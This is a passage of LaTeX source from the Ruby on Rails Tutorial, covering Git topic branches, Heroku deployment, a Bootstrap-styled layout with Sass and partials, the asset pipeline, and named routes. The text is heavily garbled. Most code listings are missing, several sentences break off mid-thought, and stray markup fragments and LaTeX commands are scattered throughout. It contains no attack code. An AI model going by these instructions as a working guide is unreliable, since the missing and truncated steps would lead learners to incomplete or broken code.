We'll see how to do this at the end of the section.
By the way, for a change as small as this one I wouldn't normally bother with a new branch, but in the present context it's a prime opportunity to start practicing good habits.
After creating the topic branch, we'll edit it to make it a little more descriptive.
I prefer the \href{http://daringfireball.net/projects/markdown/}{Markdown markup language} to the default RDoc for this purpose, and if you use the file extension \kode{.md} then Bitbucket will automatically format it nicely for you.
So, first we'll use Git's version of the Unix \kode{mv} (move) command to change the name:
Then fill \kode{README.md} with the contents of Listing~\ref{code:new_readme}.
The new \kode{README} file, \kode{README.md}.
# Ruby on Rails Tutorial: "hello, world!"
<n><n>This is the first application for the<n>[*Ruby on Rails Tutorial*](http://www.railstutorial.org/)<n>by [Michael Hartl](http://www.michaelhartl.com/).
With the changes made, we can take a look at the status of our branch:
2 files changed, 5 insertions(+), 243 deletions(-)
delete mode 100644 README.rdoc
create mode 100644 README.md
Be careful about using the \kode{-a} flag improperly; if you have added any new files to the project since the last commit, you still have to tell Git about them using \kode{git add -A} first.
Note that we write the commit message in the \emph{present} tense (and, technically speaking, the \href{http://en.wikipedia.org/wiki/Imperative_mood}{imperative mood}).
Git models commits as a series of patches, and in this context it makes sense to describe what each commit \emph{does}, rather than what it did.
Moreover, this usage matches up with the commit messages generated by Git commands themselves.
See the article ``\href{https://github.com/blog/926-shiny-new-commit-styles}{Shiny new commit styles}'' for more information.
Now that we've finished making our changes, we're ready to \emph{merge} the results back into our master branch:
Switched to branch 'master'
Updating 34f06b7..2c92bef
Fast forward
README.rdoc     |  243 --------------------------------------------------
README.md       |    5 +
Note that the Git output frequently includes things like \kode{34f06b7}, which are related to Git's internal representation of repositories.
Your exact results will differ in these details, but otherwise should essentially match the output shown above.
After you've merged in the changes, you can tidy up your branches by deleting the topic branch using \kode{git branch -d} if you're done with it:
Deleted branch modify-README (was 2c92bef).
This step is optional, and in fact it's quite common to leave the topic branch intact.
This way you can switch back and forth between the topic and master branches, merging in changes every time you reach a natural stopping point.
As mentioned above, it's also possible to abandon your topic branch \linebreak changes, in this case with \kode{git branch -D}:
# For illustration only; don't do this unless you mess up a branch
Unlike the \kode{-d} flag, the \kode{-D} flag will delete the branch even though we haven't merged in the changes.
Now that we've updated the \kode{README}, we can push the changes up to Bitbucket to see the result.
Since we have already done one push (Section~\ref{sec:bitbucket}), on most systems we can omit \kode{origin master}, and simply run \kode{git push}:
The improved \kode{README} file formatted with Markdown.
\label{fig:new_readme}}<n>\end{figure}<n><n>  % section version_control (end)<n><n>  \section{Deploying} % (fold)<n>  \label{sec:deploying}<n><n>
Even at this early stage, we're already going to deploy our (nearly empty) Rails application to production.
This step is optional, but deploying early and often allows us to catch any deployment problems early in our development cycle.
The alternative---deploying only after laborious effort sealed away in a development environment---often leads to terrible integration headaches when launch time comes
Though it shouldn't matter for the example applications in the \emph{Rails Tutorial}, if you're worried about accidentally making your app public too soon there are several options; see Section~\ref{sec:heroku_commands} for one.
Deploying Rails applications used to be a pain, but the Rails deployment ecosystem has matured rapidly in the past few years, and now there are several great options.
Pronounced ``Engine X''.
My favorite Rails deployment option is Heroku, which is a hosted platform built specifically for deploying Rails and other web applications
Heroku makes deploying Rails applications ridiculously easy---as long as your source code is under version control with Git.
(This is yet another reason to follow the Git setup steps in Section~\ref{sec:version_control} if you haven't already.)
In addition, for many purposes, including for this tutorial, Heroku's free tier is more than sufficient.
Indeed, the first two editions of this tutorial were hosted for free on Heroku, which served several million requests without charging me a cent.
The rest of this section is dedicated to deploying our first application to Heroku.
Some of the ideas are fairly advanced, so don't worry about understanding all the details; what's important is that by the end of the process we'll have deployed our application to the live web.
<n><n>    \subsection{Heroku setup}<n>    \label{sec:heroku_setup}<n><n>
Heroku uses the \href{http://www.postgresql.org/}{PostgreSQL} database (pronounced ``post-gres-cue-ell'', and often called ``Postgres'' for short), which means that we need to add the \texttt{pg}~gem in the production environment to allow Rails to talk to Postgres
:\footnote{
Generally speaking, it's a good idea for the development and production environments to match as closely as possible, which includes using the same database, but for the purposes of this tutorial we'll always use SQLite locally and PostgreSQL in production.
See Section~\ref{sec:sample_app_setup} for more information.
in Listing~\ref{code:gemfile_pg_gem}.
To prepare the system for deployment to production, we run \kode{bundle install} with a special flag to prevent the local installation of any production gems (which in this case consists of~\texttt{pg} and \texttt{rails\_12factor}):
We can commit the resulting change as follows:
Next we have to create and configure a new Heroku account.
The first step is to \href{http://api.heroku.com/signup}{sign up for Heroku}.
Then check to see if your system already has the Heroku command-line client installed:
Those using the cloud IDE should see the Heroku version number, indicating that the \kode{heroku} CLI is available, but on other systems it may be necessary to install it using the \href{https://toolbelt.heroku.com/}{Heroku Toolbelt}
Once you've verified that the Heroku command-line interface is installed, use the \kode{heroku} command to log in and add your SSH key:
Finally, use the \kode{heroku create} command to create a place on the Heroku servers for the sample app to live (Listing~\ref{code:heroku_create}).
Creating a new application at Heroku.
Git remote heroku added
The \kode{heroku} command creates a new subdomain just for our application, available for immediate viewing.
There's nothing there yet, though, so let's get busy deploying.
<n><n>    \subsection{Heroku deployment, step one}<n>    \label{sec:heroku_step_one}<n><n>
To deploy the application, the first step is to use Git to push the master branch up to Heroku:
$ git push heroku
(You may see some warning messages, which you should ignore for now.
We'll discuss them further in Section~\ref{sec:professional_grade_deployment}.)
There is no step two!
We're already done.
To see your newly deployed application, visit the address that you saw when you ran \kode{heroku create} (i.e., Listing~\ref{code:heroku_create}).
(If you're working on your local machine instead of the cloud IDE, you can also use \kode{heroku open}.)
The result appears in Figure~\ref{fig:heroku_app}.
The page is identical to Figure~\ref{fig:hello_world_hello_app}, but now it's running in a production environment on the live web.
The first Rails Tutorial application running on Heroku.
There are many \href{http://devcenter.heroku.com/heroku-command}{Heroku commands}, and we'll barely scratch the surface in this book.
Let's take a minute to show just one of them by renaming the application as follows:
Don't use this name yourself; it's already taken by me!
In fact, you probably shouldn't bother with this step right now; using the default address supplied by Heroku is fine.
But if you do want to rename your application, you can arrange for it to be reasonably secure by using a random or obscure subdomain, such as the following:
hwpcbmze.herokuapp.com<n>seyjhflo.herokuapp.com<n>jhyicevg.herokuapp.com
With a random subdomain like this, someone could visit your site only if you gave them the address.
(By the way, as a preview of Ruby's compact awesomeness, here's the code I used to generate the random subdomains:
Pretty sweet.)
In addition to supporting subdomains, Heroku also supports custom domains.
(In fact, the \href{http://www.railstutorial.org}{Ruby on Rails Tutorial site} lives at Heroku; if you're reading this book online, you're looking at a Heroku-hosted site right now!)
See the \href{http://devcenter.heroku.com/}{Heroku documentation} for more information about custom domains and other Heroku topics.
We've come a long way in this chapter: installation, development environment setup, version control, and deployment.
In the next chapter, we'll build on the foundation from Chapter~\ref{cha:beginning} to make a database-backed \emph{toy app}, which will give us our first real taste of what Rails can do.
If you'd like to share your progress at this point, feel free to send a tweet or Facebook status update with something like this:
I'm learning Ruby on Rails with the @railstutorial!
}.<n><n>\subsection{What we learned in this chapter} % (fold)<n>\label{sec:beginning_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
Ruby on Rails is a web development framework written in the Ruby programming language.
Installing Rails, generating an application, and editing the resulting files is easy using a pre-configured cloud environment.
We added a controller action and modified the root route to create a ``hello, world'' application.
We protected against data loss while enabling collaboration by placing our application source code under version control with Git and pushing the resulting code to a private repository at Bitbucket.
We deployed our application to a production environment using Heroku.
Change the content of the \kode{hello} action in Listing~\ref{code:hello_action} to read ``hola, mundo!'' instead of ``hello, world!''.
\emph{Extra credit}: Show that Rails supports non-\href{http://es.wikipedia.org/wiki/ASCII}{ASCII} characters by including an inverted exclamation point, as in ``¡Hola, mundo!'' (Figure~\ref{fig:hola_mundo})
Your editor may display a message like ``invalid multibyte character'', but this is not a cause for concern.
You can \href{http://lmgtfy.com/?q=invalid+multibyte+character}{Google the error message} if you want to learn how to make it go away.
By following the example of the \kode{hello} action in Listing~\ref{code:hello_action}, add a second action called \kode{goodbye} that renders the text ``goodbye, world!''.
Edit the routes file from Listing~\ref{code:hello_root_route} so that the root route goes to \kode{goodbye} instead of to \kode{hello} (Figure~\ref{fig:goodbye_world}).
Changing the root route to return ``¡Hola, mundo!''.
Changing the root route to return ``goodbye, world!''.
beginning
For a suggestion on how to avoid conflicts between exercises and the main tutorial, see the note on exercise topic branches in Section~\ref{sec:static_pages_exercises}.
\emph{Note}: The \emph{Solutions Manual for Exercises}, with solutions to every exercise in the \emph{Ruby on Rails Tutorial} book, is included for free with every purchase at \href{http://www.railstutorial.org/}{www.railstutorial.org}.
Thanks to reader \href{https://twitter.com/colmtuite}{Colm Tuite} for his excellent work in helping to convert the sample application over to the Bootstrap CSS framework.
We'll end by taking a first important step toward letting users sign up to our site (Section~\ref{sec:user_signup}).
As a result, we'll spend most of our time in our text editor and browser, using TDD only to add a Contact page (Section~\ref{sec:contact_page}).
We will add an important new test, though, writing our first \emph{integration test} to check that the links on the final layout are correct (Section~\ref{sec:layout_link_tests}).
<n><n>  \section{Adding some structure} % (fold)<n>  \label{sec:structure}<n><n>
The \emph{Ruby on Rails Tutorial} is a book on web development, not web design, but it would be depressing to work on an application that looks like \emph{complete} crap, so in this section we'll add some structure to the layout and give it some minimal styling with CSS. In addition to using some custom CSS rules, we'll make use of \href{http://getbootstrap.com/}{\emph{Bootstrap}}, an open-source web design framework from Twitter.
We'll also give our \emph{code} some styling, so to speak, using \emph{partials} to tidy up the layout once it gets a little cluttered.
Throughout the rest of this book, I will thus often include \emph{mockups} (in a web context often called \emph{wireframes}), which are rough sketches of what the eventual application will look like
The mockups in the \emph{Ruby on Rails Tutorial} are made with an excellent online mockup application called \href{http://gomockingbird.com}{Mockingbird}.
In this chapter, we will principally be developing the static pages introduced in Section~\ref{sec:static_pages}, including a site logo, a navigation header, and a site footer.
A mockup for the most important of these pages, the Home page, appears in Figure~\ref{fig:home_page_mockup}.
You can see the final result in Figure~\ref{fig:site_with_footer}.
You'll note that it differs in some details---for example, we'll end up adding a Rails logo on the page---but that's fine, since a mockup need not be exact.
A mockup of the sample application's Home page.
As usual, if you're using Git for version control, now would be a good time to make a new branch:
This includes some additional divisions, some CSS classes, and the start of our site navigation.
The full file is in Listing~\ref{code:layout_new_structure}; explanations for the various pieces follow immediately thereafter.
If you'd rather not delay gratification, you can see the results in Figure~\ref{fig:layout_no_logo_or_custom_css}.
(\emph{Note}: it's not (yet) very gratifying.)
The site layout with added structure.
DOCTYPE html>
<html>
<head>
<!--[if lt IE 9]>
    <![endif]
</head>
<body>
<nav>
</ul>
</nav>
</header>
</body>
</html>
Let's look at the new elements in Listing~\ref{code:layout_new_structure} from top to bottom.
The words \emph{shim} and \emph{shiv} are used interchangably in this context; the former is the proper term, based on the English word whose meaning is ``a washer or thin strip of material used to align parts, make them fit, or reduce wear'', while the latter (meaning ``a knife or razor used as a weapon'') is apparently a play on the name of the shim's original author, Sjoerd Visscher.
The somewhat odd syntax
includes the enclosed line only if the version of Microsoft Internet Explorer~(IE) is less than~9 (\kode{if lt IE 9}).
The weird \kode{[if lt IE 9]} syntax is \emph{not} part of Rails; it's actually a \href{http://en.wikipedia.org/wiki/Conditional_comment}{conditional comment} supported by Internet Explorer browsers for just this sort of situation.
It's a good thing, too, because it means we can include the HTML5 shim \emph{only} for IE browsers less than version~9, leaving other browsers such as Firefox, Chrome, and Safari unaffected.
The next section includes a \kode{header} for the site's (plain-text) logo, a couple of divisions (using the \kode{div} tag), and a list of elements with navigation links:
Here the \kode{header} tag indicates elements that should go at the top of the page.
These are completely unrelated to Ruby classes.
All HTML elements can be assigned both classes and \emph{ids}; these are merely labels, and are useful for styling with CSS (Section~\ref{sec:custom_css}).
The main difference between classes and ids is that classes can be used multiple times on a page, but ids can be used only once.
In the present case, all the navbar classes have special meaning to the Bootstrap framework, which we'll install and use in Section~\ref{sec:custom_css}.
Inside the \kode{header} tag, we see a \kode{div} tag:
The \kode{div} tag is a generic division; it doesn't do anything apart from divide the document into distinct parts.
In older-style HTML, \kode{div} tags are used for nearly all site divisions, but HTML5 adds the \kode{header}, \kode{nav}, and \kode{section} elements for divisions common to many applications.
In this case, the \kode{div} has a CSS class as well (\kode{container}).
As with the \kode{header} tag's classes, this class has special meaning to Bootstrap.
After the div, we encounter some embedded Ruby:
The third argument is an options hash, in this case adding the CSS~id \kode{logo} to the sample app link.
(The other three links have no options hash, which is fine since it's optional.)
Rails helpers often take options hashes in this way, giving us the flexibility to add arbitrary HTML options without ever leaving Rails.
The second element inside the divs is a list of navigation links, made using the \emph{unordered list} tag \kode{ul}, together with the \emph{list item} tag \kode{li}:
The \kode{<nav>} tag, though formally unnecessary here, is used to more clearly communicate the purpose of the navigation links.
Meanwhile, the \kode{nav}, \linebreak \kode{navbar-nav}, and \kode{navbar-right} classes on the \kode{ul} tag have special meaning to Bootstrap and will be styled automatically when we include the Bootstrap CSS in Section~\ref{sec:custom_css}.
As you can verify by inspecting the navigation in your browser, once Rails has processed the layout and evaluated the embedded Ruby the list looks like this
The spacing might look slightly different, which is fine because (as noted in Section~\ref{sec:testing_titles}) HTML is insensitive to whitespace.
This is the text that will be returned to the browser.
The final part of the layout is a \kode{div} for the main content:
As before, the \kode{container} class has special meaning to Bootstrap.
As we learned in Section~\ref{sec:layouts_and_embedded_ruby}, the \kode{yield} method inserts the contents of each page into the site layout.
Apart from the site footer, which we'll add in Section~\ref{sec:partials}, our layout is now complete, and we can look at the results by visiting the Home page.
To take advantage of the upcoming style elements, we'll add some extra elements to
The Home page with a link to the signup page.
    This is the home page for the
    sample application.
</h2>
In preparation for adding users to our site in Chapter~\ref{cha:sign_up}, the first \kode{link\_to} creates a stub link of the form
In the \kode{div} tag, the \kode{jumbotron} CSS class has a special meaning to Bootstrap, as do the \kode{btn}, \kode{btn-lg}, and \kode{btn-primary} classes in the signup button.
The second \kode{link\_to} shows off the \kode{image\_tag} helper, which takes as arguments the path to an image and an optional options hash, in this case setting the \kode{alt} attribute of the image tag using symbols.
If you're using the cloud IDE or another Unix-like system, you can accomplish this with the \kode{curl} utility as follows
If you have \href{http://brew.sh/}{Homebrew} on OS~X, you can install \kode{curl} using \kode{brew install curl}.
If the second command fails, which sometimes happens on the cloud IDE for reasons I don't understand, try re-running the first \kode{curl} command until the file downloads correctly.
(For more on \kode{curl}, see \href{http://conqueringthecommandline.com/book/curl}{Chapter 3 of \emph{Conquering the Command Line}}.)
Because we used the \kode{image\_tag} helper in Listing~\ref{code:signup_button}, Rails will automatically find any images in the \kode{app/assets/images/} directory using the asset pipeline (Section~\ref{sec:sass_and_the_asset_pipeline}).
To make the effects of \kode{image\_tag} clearer, let's look at the HTML it produces
Tags that follow this form are known as \emph{self-closing} tags.
Here the string \kode{9308b8f92fea4c19a3a0d8385b494526} (which will differ on your system) is added by Rails to ensure that the filename is unique, which causes browsers to load images properly when they have been updated (instead of retrieving them from the browser cache).
Note that the \kode{src} attribute \emph{doesn't} include \kode{images}, instead using an \kode{assets} directory common to all assets (images, JavaScript, CSS, etc.).
Meanwhile, the \kode{alt} attribute is what will be displayed if the page is accessed by a program that can't display images (such as screen readers for the visually impaired).
Although people are sometimes sloppy about including the \kode{alt} attribute for images, it is in fact required by the HTML standard.
In this case, though, we've set the \kode{alt} text explicitly in order to capitalize ``Rails''.
Now we're finally ready to see the fruits of our labors, as shown in Figure~\ref{fig:layout_no_logo_or_custom_css}.
Pretty underwhelming, you say?
Perhaps so.
Happily, though, we've done a good job of giving our HTML elements sensible classes, which puts us in a great position to add style to the site with CSS.
In Section~\ref{sec:adding_to_the_layout}, we associated many of the HTML elements with CSS classes, which gives us considerable flexibility in constructing a layout based on CSS.
As noted in Section~\ref{sec:adding_to_the_layout}, many of these classes are specific to \href{http://getbootstrap.com/}{Bootstrap}, a framework from Twitter that makes it easy to add nice web design and user interface elements to an HTML5 application.
In this section, we'll combine Bootstrap with some custom CSS rules to start adding some style to the sample application.
It's worth noting that using Bootstrap automatically makes our application's design \href{http://en.wikipedia.org/wiki/Responsive_web_design}{\emph{responsive}}, ensuring that it looks sensible across a wide range of devices.
Our first step is to add Bootstrap, which in Rails applications can be accomplished with the \texttt{bootstrap-sass} gem, as shown in Listing~\ref{code:bootstrap_sass}.
The Bootstrap framework natively uses the \href{http://lesscss.org/}{Less CSS} language for making dynamic stylesheets, but the Rails asset pipeline supports the (very similar) Sass language by default (Section~\ref{sec:sass_and_the_asset_pipeline}), so \texttt{bootstrap-sass} converts Less to Sass and makes all the necessary Bootstrap files available to the current application
It is also possible to use Less with the asset pipeline; see the \href{http://rubygems.org/gems/less-rails-bootstrap}{\texttt{less-rails-bootstrap} gem} for details.
To install Bootstrap, we run \kode{bundle install} as usual:
Although \kode{rails generate} automatically creates a separate CSS file for each controller, it's surprisingly hard to include them all properly and in the right order, so for simplicity we'll put all of the CSS needed for this tutorial in a single file.
The first step toward getting custom CSS to work is to create such a custom CSS file:
app/assets/stylesheets/custom.css.scss
(This uses the \kode{touch} trick from Section~\ref{sec:green} en route, but you can create the file however you like.)
Here both the directory name and filename extension are important.
The directory
app/assets/stylesheets/
is part of the asset pipeline (Section~\ref{sec:sass_and_the_asset_pipeline}), and any stylesheets in this directory will automatically be included as part of the \kode{application.css} file included in the site layout.
Furthermore, the filename \kode{custom.css.scss} includes the \kode{.css} extension, which indicates a CSS file, and the \kode{.scss} extension, which indicates a ``Sassy CSS'' file and arranges for the asset pipeline to process the file using Sass.
(We won't be using Sass until Section~\ref{sec:sass}, but it's needed now for the \texttt{bootstrap-sass} gem to work its magic.)
Inside the file for the custom CSS, we can use the \kode{@import} function to include Bootstrap (together with the associated Sprockets utility), as shown in Listing~\ref{code:bootstrap_css}
If these steps seem mysterious, take heart: I'm just following the instructions from the \href{https://github.com/twbs/bootstrap-sass#bootstrap-for-sass---}{bootstrap-sass README file}.
Adding Bootstrap CSS.
The two lines in Listing~\ref{code:bootstrap_css} include the entire Bootstrap CSS framework.
After restarting the web server to incorporate the changes into the development application (by pressing Ctrl-C and then running \kode{rails server} as in Section~\ref{sec:rails_server}), the results appear as in Figure~\ref{fig:sample_app_only_bootstrap}.
The placement of the text isn't good and the logo doesn't have any style, but the colors and signup button look promising.
Next we'll add some CSS that will be used site-wide for styling the layout and each individual page, as shown in Listing~\ref{code:universal_css}.
The result is shown in Figure~\ref{fig:sample_app_universal}.
Adding CSS for some universal styling applying to all pages.
/* universal */
Adding some spacing and other universal styling.
Note that the CSS in Listing~\ref{code:universal_css} has a consistent form.
In general, CSS rules refer either to a class, an id, an HTML tag, or some combination thereof, followed by a list of styling commands.
For example,
puts 60~pixels of padding at the top of the page.
Because of the \linebreak \kode{navbar-fixed-top} class in the \kode{header} tag, Bootstrap fixes the navigation bar to the top of the page, so the padding serves to separate the main text from the navigation.
(Because the default navbar color changed after Bootstrap 2.0, we need the \kode{navbar-inverse} class to make it dark instead of light.)
Meanwhile, the CSS in the rule
associates the \kode{center} class with the \kode{text-align: center} property.
In other words, the dot \kode{.} in \kode{.center} indicates that the rule styles a class.
This means that elements inside any tag (such as a \kode{div}) with class \kode{center} will be centered on the page.
(We saw an example of this class in Listing~\ref{code:signup_button}.)
Although Bootstrap comes with CSS rules for nice typography, we'll also add some custom rules for the appearance of the text on our site, as shown in Listing~\ref{code:typography_css}.
(Not all of these rules apply to the Home page, but each rule here will be used at some point in the sample application.)
The result of Listing~\ref{code:typography_css} is shown in Figure~\ref{fig:sample_app_typography}.
Adding CSS for nice typography.
/* typography */
Adding some typographic styling.
Finally, we'll add some rules to style the site's logo, which simply consists of the text ``sample app''.
The CSS in Listing~\ref{code:logo_css} converts the text to uppercase and modifies its size, color, and placement.
(We've used a CSS~id because we expect the site logo to appear on the page only once, but you could use a class instead.)
Adding CSS for the site logo.
/* header */
HTML colors can be coded with three pairs of base-16 (hexadecimal) numbers, one each for the primary colors red, green, and blue (in that order).
The code
The result of the CSS in Listing~\ref{code:logo_css} is shown in Figure~\ref{fig:sample_app_logo}.
The sample app with nicely styled logo.
Although the layout in Listing~\ref{code:layout_new_structure} serves its purpose, it's getting a little cluttered.
The HTML shim takes up three lines and uses weird IE-specific syntax, so it would be nice to tuck it away somewhere on its own.
In addition, the header HTML forms a logical unit, so it should all be packaged up in one place.
The way to achieve this in Rails is to use a facility called \emph{partials}.
Let's first take a look at what the layout looks like after the partials are defined (Listing~\ref{code:layout_with_partials}).
The site layout with partials for the stylesheets and header.
In Listing~\ref{code:layout_with_partials}, we've replaced the HTML shim stylesheet lines with a single call to a Rails helper called \kode{render}:
Many Rails developers use a \kode{shared} directory for partials shared across different views.
I prefer to use the \kode{shared} folder for utility partials that are useful on multiple views, while putting partials that are literally on every page (as part of the site layout) in the \kode{layouts} directory.
(We'll create the \kode{shared} directory starting in Chapter~\ref{cha:sign_up}.)
That seems to me a logical division, but putting them all in the \kode{shared} folder certainly works fine, too.
Of course, to get the partial to work, we have to create the corresponding file and fill it with some content.
In the case of the shim partial, this is just the three lines of shim code from Listing~\ref{code:layout_new_structure}.
The result appears in Listing~\ref{code:stylesheets_partial}
A partial for the HTML shim.
Similarly, we can move the header material into the partial shown in Listing~\ref{code:header_partial} and insert it into the layout with another call to \kode{render}.
(As usual with partials, you will have to create the file by hand using your text editor.)
A partial for the site header.
Now that we know how to make partials, let's add a site footer to go along with the header.
You may wonder why we use both the \kode{footer} tag and \kode{.footer} class.
The answer is that the tag has a clear meaning to human readers, and the class is used by Bootstrap.
Using a \kode{div} tag in place of \kode{footer} would work as well.
A partial for the site footer.
<small>
Michael Hartl
</small>
</footer>
About
Contact
(As with \kode{header}, the \kode{footer} tag is new in HTML5.)
We can render the footer partial in the layout by following the same pattern as the stylesheets and header partials (Listing~\ref{code:layout_with_footer}).
The site layout with a footer partial.
Of course, the footer will be ugly without some styling (Listing~\ref{code:footer_css}).
The results appear in Figure~\ref{fig:site_with_footer}.
Adding the CSS for the site footer.
/* footer */
The Home page with an added footer.
One of the most notable additions in recent versions of Rails is the \emph{asset pipeline}, which significantly improves the production and management of static assets such as CSS, JavaScript, and images.
This section first gives a high-level overview of the asset pipeline, and then shows how to use \emph{Sass}, a powerful tool for writing CSS.
The asset pipeline involves lots of changes under Rails' hood, but from the perspective of a typical Rails developer there are three principal features to understand: asset directories, manifest files, and preprocessor engines
The structure of this section is based on the excellent blog post ``The Rails 3 Asset Pipeline in (about) 5 Minutes'' by Michael Erasmus.
For more details, see the \href{http://guides.rubyonrails.org/asset_pipeline.html}{Rails Guide on the Asset Pipeline}.
Let's consider each in turn.
Asset directories
In Rails version 3.0 and earlier, static assets lived in the \kode{public/} directory, as follows:
Files in these directories are (even post-3.0) automatically served up via requests to http://www.example.com/stylesheets, etc.
In the latest version of Rails, there are \emph{three} canonical directories for static assets, each with its own purpose:
\kode{app/assets}: assets specific to the present application
\kode{lib/assets}: assets for libraries written by your dev team
\kode{vendor/assets}: assets from third-party vendors
As you might guess, each of these directories has a subdirectory for each asset class, e.g.,
Manifest files
Once you've placed your assets in their logical locations, you can use \emph{manifest files} to tell Rails (via the \href{https://github.com/sstephenson/sprockets}{Sprockets} gem) how to combine them to form single files.
(This applies to CSS and JavaScript but not to images.)
As an example, let's take a look at the default manifest file for app stylesheets (Listing~\ref{code:app_css_manifest}).
The manifest file for app-specific CSS.
You're free to add
<n> *= require_tree .
<n> *= require_self
The key lines here are actually CSS comments, but they are used by Sprockets to include the proper files:
<n>*= require_tree .
ensures that all CSS files in the \kode{app/assets/stylesheets} directory (including the tree subdirectories) are included into the application CSS. The line
<n>*= require_self
specifies where in the loading sequence the CSS in \kode{application.css} itself gets included.
Rails comes with sensible default manifest files, and in the \emph{Rails Tutorial} we won't need to make any changes, but the \href{http://guides.rubyonrails.org/asset_pipeline.html}{Rails Guides entry on the asset pipeline} has more detail if you need it.
Preprocessor engines
After you've assembled your assets, Rails prepares them for the site template by running them through several preprocessing engines and using the manifest files to combine them for delivery to the browser.
We tell Rails which processor to use using filename extensions; the three most common cases are \kode{.scss} for Sass, \kode{.coffee} for CoffeeScript, and \kode{.erb} for embedded Ruby (ERb).
We first covered ERb in Section~\ref{sec:layouts_and_embedded_ruby}, and cover Sass in Section~\ref{sec:sass}.
We won't be needing CoffeeScript in this tutorial, but it's an elegant little language that compiles to JavaScript.
(The \href{http://railscasts.com/episodes/267-coffeescript-basics}{RailsCast on CoffeeScript basics} is a good place to start.)
The preprocessor engines can be chained, so that
gets run through the CoffeeScript processor, and
gets run through both CoffeeScript and ERb (with the code running from right to left, i.e., CoffeeScript first).
Efficiency in production
One of the best things about the asset pipeline is that it automatically results in assets that are optimized to be efficient in a production application.
Traditional methods for organizing CSS and JavaScript involve splitting functionality into separate files and using nice formatting (with lots of indentation).
While convenient for the programmer, this is inefficient in production.
In particular, including multiple full-sized files can significantly slow page-load times, which is one of the most important factors affecting the quality of the user experience.
With the asset pipeline, we don't have to choose between speed and convenience: we can work with multiple nicely formatted files in development, and then use the asset pipeline to make efficient files in production.
In particular, the asset pipeline combines all the application stylesheets into one CSS file (\kode{application.css}), combines all the application JavaScript into one JavaScript file (\kode{application.js}), and then \emph{minifies} them to remove the unnecessary spacing and indentation that bloats file size.
The result is the best of both worlds: convenience in development and efficiency in production.
<n><n>    % subsection the_asset_pipeline (end)<n><n>    \subsection{Syntactically awesome stylesheets} % (fold)<n>    \label{sec:sass}<n><n>
\emph{Sass} is a language for writing stylesheets that improves on CSS in many ways.
In this section, we cover two of the most important improvements, \emph{nesting} and \emph{variables}.
(A third technique, \emph{mixins}, is introduced in Section~\ref{sec:rails_environments}.)
This means that every valid CSS file is also a valid SCSS file, which is convenient for projects with existing style rules.
In our case, we used SCSS from the start in order to take advantage of Bootstrap.
Since the Rails asset pipeline automatically uses Sass to process files with the \kode{.scss} extension, the \kode{custom.css.scss} file will be run through the Sass preprocessor before being packaged up for delivery to the browser.
A common pattern in stylesheets is having rules that apply to nested elements.
For example, in Listing~\ref{code:universal_css} we have rules both for \kode{.center} and for \kode{.center h1}:
We can replace this in Sass with
Here the nested \kode{h1} rule automatically inherits the \kode{.center} context.
There's a second candidate for nesting that requires a slightly different syntax.
In Listing~\ref{code:logo_css}, we have the code
Both of these nesting techniques apply to the footer CSS in Listing~\ref{code:footer_css}, which can be transformed into the following:
Converting Listing~\ref{code:footer_css} by hand is a good exercise, and you should verify that the CSS still works properly after the conversion.
Sass allows us to define \emph{variables} to eliminate duplication and write more expressive code.
For example, looking at Listing~\ref{code:typography_css} and Listing~\ref{code:footer_css}, we see that there are repeated references to the same color:
This allows us to rewrite our SCSS like this:
Indeed, the Bootstrap framework defines a large number of variables for colors, available online on the \href{http://getbootstrap.com/customize/#less-variables}{Bootstrap page of Less variables}.
That page defines variables using Less, not Sass, but the \texttt{bootstrap-sass} gem provides the Sass equivalents.
Looking at the Bootstrap variable page, we see that there is a variable for light gray:
This means that
Applying the Sass nesting and variable definition features to the full SCSS file gives the file in Listing~\ref{code:refactored_scss}.
Note in particular the dramatic improvement in the rules for the \kode{footer} tag.
The initial SCSS file converted to use nesting and variables.
/* mixins, variables, etc. */
Sass gives us even more ways to simplify our stylesheets, but the code in Listing~\ref{code:refactored_scss} uses the most important features and gives us a great start.
See the \href{http://sass-lang.com/}{Sass website} for more details.
Of course, we could hard-code links like
but that isn't the Rails Way™.
/about
Moreover, Rails conventionally uses \emph{named routes}, which involves code like
This way the code has a more transparent meaning, and it's also more flexible since we can change the definition of \kode{about\_path} and have the URL change everywhere \kode{about\_path} is used.
The full list of our planned links appears in Table~\ref{table:url_mapping}, along with their mapping to URLs and routes.
We took care of the first route in Section~\ref{sec:setting_the_root_route}, and we'll have implemented all but the last one by the end of this chapter.
(We'll make the last one in Chapter~\ref{cha:log_in_log_out}.)
/help
/contact
/signup
/login
Route and URL mapping for site links.
\label{table:url_mapping}}<n>\end{table}<n><n>\subsection{Contact page} % (fold)<n>\label{sec:contact_page}<n><n>
For completeness, we'll add the Contact page, which was left as an exercise in Chapter~\ref{cha:static_pages}.
The test appears as in Listing~\ref{code:contact_page_test}, which simply follows the model last seen in Listing~\ref{code:title_tests}.
A test for the Contact page. 
"Ruby on Rails Tutorial Sample App"
<n><n>  test "should get help" do<n>    get :help<n>    assert_response :success<n>    assert_select "title", "Help
 | Ruby on Rails Tutorial Sample App
The application code parallels the addition of the About page in Section~\ref{sec:getting_started_with_testing}: first we update the routes (Listing~\ref{code:contact_route}), then we add a \kode{contact} action to the Static Pages controller (Listing~\ref{code:contact_action}), and finally we create a Contact view (Listing~\ref{code:contact_view}).
Adding a route for the Contact page. 
Adding an action for the Contact page. 
The view for the Contact page. 
Now make sure that the tests are \passing:
<n>\end{code}<n>\end{codelisting}<n><n>    % subsection route_tests (end)<n><n>    \subsection{Rails routes} % (fold)<n>    \label{sec:rails_routes}<n><n>To add the named routes for the sample app's static pages, we'll edit the routes file, \kode{config/\-routes.rb}, that Rails uses to define URL mappings. 
We'll begin by reviewing the route for the Home page (defined in Section~\ref{sec:setting_the_root_route}), which is a special case, and then define a set of routes for the remaining static pages.
So far, we've seen three examples of how to define a root route, starting with the code
in the hello app (Listing~\ref{code:hello_root_route}), the code
in the toy app (Listing~\ref{code:rails_routes_root_route}), and the code
in the sample app (Listing~\ref{code:home_root_route}).
In each case, the \kode{root} method arranges for the root path / to be routed to a controller and action of our choice.
Defining the root route in this way has a second important effect, which is to create named routes that allow us to refer to routes by a name rather than by the raw URL. In this case, these routes are \kode{root\_path} and \kode{root\_url}, with the only difference being that the latter includes the full URL:
In the \emph{Rails Tutorial}, we'll follow the common convention of using the \kode{\_path} form except when doing redirects, where we'll use the \kode{\_url} form.
(This is because the HTTP standard technically requires a full URL after redirects, though in most browsers it will work either way.)
To define the named routes for the Help, About, and Contact pages, we need to make changes to the \kode{get} rules from Listing~\ref{code:contact_route}, transforming lines like
As with the rule for the root route, this creates two named routes, \kode{help\_path} and \kode{help\_url}:
